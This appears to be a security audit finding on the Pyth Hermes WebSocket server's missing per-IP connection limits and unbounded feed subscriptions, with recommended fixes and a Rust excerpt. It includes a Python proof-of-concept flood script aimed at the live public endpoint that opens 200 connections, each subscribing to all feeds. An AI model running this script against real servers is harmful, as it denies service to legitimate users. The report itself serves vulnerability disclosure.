### Title
Hermes WebSocket Server Lacks Per-IP Connection Limit and Per-Subscription Feed Count Bound, Enabling Single-Client Server-Side Computation Exhaustion — (`apps/hermes/server/src/api/ws.rs`)

---

### Summary

The Hermes WebSocket server enforces an outbound-bytes rate limit per IP address but imposes no limit on the number of concurrent WebSocket connections per IP and no upper bound on the number of price feed IDs a client may subscribe to in a single `Subscribe` message. On every price aggregation event (~400 ms), the server performs `get_price_feeds_with_update_data` for the full set of subscribed feeds **before** any rate-limit check is applied. A single unprivileged client can therefore force O(connections × feeds) server-side computation on every update cycle, with the rate limiter only closing connections after the expensive work is already done.

---

### Finding Description

**Entry point — `ClientMessage::Subscribe`:** [1](#0-0) 

The `ids` field is an unbounded `Vec<PriceIdInput>`. No maximum cardinality is enforced anywhere in the subscription handler.

**Rate limiter scope — outbound bytes only:** [2](#0-1) 

The `WsState` rate limiter is keyed on `IpAddr` and counts **outbound bytes per second**: [3](#0-2) 

There is no analogous limit on the number of concurrent connections accepted from a single IP, nor on the number of feeds per subscription.

**Computation precedes rate-limit check — `handle_price_feeds_update`:** [4](#0-3) 

`get_price_feeds_with_update_data` is called for the full list of subscribed feed IDs. Only after this call completes and the per-feed messages are serialised does the rate-limit check run: [5](#0-4) 

If the byte budget is exceeded the connection is closed, but the server has already performed the full fetch-and-serialise work for every subscribed feed.

**No per-IP connection cap:**

`subscriber_counter` is a monotonically increasing `AtomicUsize` used only for logging/metrics. No code path rejects a new connection because the originating IP already has N active connections. [6](#0-5) 

---

### Impact Explanation

An unprivileged attacker opens K WebSocket connections (from one or more IPs) and on each sends a single `Subscribe` message listing all M available price feeds (currently ~500+). Every ~400 ms the Hermes aggregation event fires and the server executes `get_price_feeds_with_update_data` K × M times before any rate-limit enforcement. The outbound-bytes limiter then closes the connections, but the attacker immediately reconnects and repeats. The server performs unbounded server-side work proportional to K × M on every aggregation cycle, degrading or denying service to legitimate consumers of the public Hermes API.

---

### Likelihood Explanation

The Hermes WebSocket endpoint is publicly reachable with no authentication required for the free tier. Opening hundreds of connections and sending a single large subscribe message per connection is trivially scriptable. The 256 KiB/s outbound cap and 24-hour deadline provide no protection against the server-side computation phase, which is the resource being abused. [7](#0-6) 

---

### Recommendation

1. **Enforce a per-IP concurrent-connection limit** in `websocket_handler` before calling `subscriber.run()`, rejecting new connections once the per-IP count exceeds a configured threshold.
2. **Cap the number of price feed IDs per subscription** (e.g., 100 feeds per connection), analogous to the `MAX_PRICE_IDS_PER_SUBSCRIPTION = 255` guard already present in the Pulse Scheduler: [8](#0-7) 
3. **Move the rate-limit check before the expensive `get_price_feeds_with_update_data` call**, or account for the number of subscribed feeds in the rate-limit token cost so that high-cardinality subscriptions are throttled at the computation stage, not only at the send stage.
4. Consider a **per-IP inbound message rate limit** (subscribe/unsubscribe messages per second) to prevent rapid reconnect-and-resubscribe cycling.

---

### Proof of Concept

```python
import asyncio, websockets, json

TARGET = "wss://hermes.pyth.network/ws"
# Fetch all ~500 feed IDs from /api/v2/price_feeds and fill this list
ALL_FEED_IDS = ["0x...", ...]  # 500+ IDs

async def flood_connection():
    async with websockets.connect(TARGET) as ws:
        await ws.send(json.dumps({
            "type": "subscribe",
            "ids": ALL_FEED_IDS,
            "verbose": False,
            "binary": False,
        }))
        # Hold connection open; server does O(500) work every ~400 ms
        await asyncio.sleep(60)

async def main():
    # Open 200 concurrent connections from the same IP
    await asyncio.gather(*[flood_connection() for _ in range(200)])

asyncio.run(main())
```

Each of the 200 connections causes the server to call `get_price_feeds_with_update_data` with 500 feed IDs on every aggregation event. The outbound-bytes rate limiter closes connections after the first few messages, but the attacker reconnects immediately, sustaining the computation load indefinitely.

        let price_feed_ids = self
            .price_feeds_with_config
            .keys()
            .cloned()
            .collect::<Vec<_>>();

        let state = &*self.state;
        let updates = match Aggregates::get_price_feeds_with_update_data(
            state,
            &price_feed_ids,
            RequestTime::AtSlot(event.slot()),
        )
        .await
        {
            Ok(updates) => updates,
            Err(_) => {
                // The error can only happen when a price feed was available
                // and is no longer there as we check the price feed ids upon
                // subscription. In this case we just remove the non-existing
                // price feed from the list and will keep sending updates for
                // the rest.
                let available_price_feed_ids = Aggregates::get_price_feed_ids(state).await;

                self.price_feeds_with_config
                    .retain(|price_feed_id, _| available_price_feed_ids.contains(price_feed_id));

                let price_feed_ids = self
                    .price_feeds_with_config
                    .keys()
                    .cloned()
                    .collect::<Vec<_>>();

                Aggregates::get_price_feeds_with_update_data(
                    state,
                    &price_feed_ids,
                    RequestTime::AtSlot(event.slot()),
                )
                .await?
            }
        };
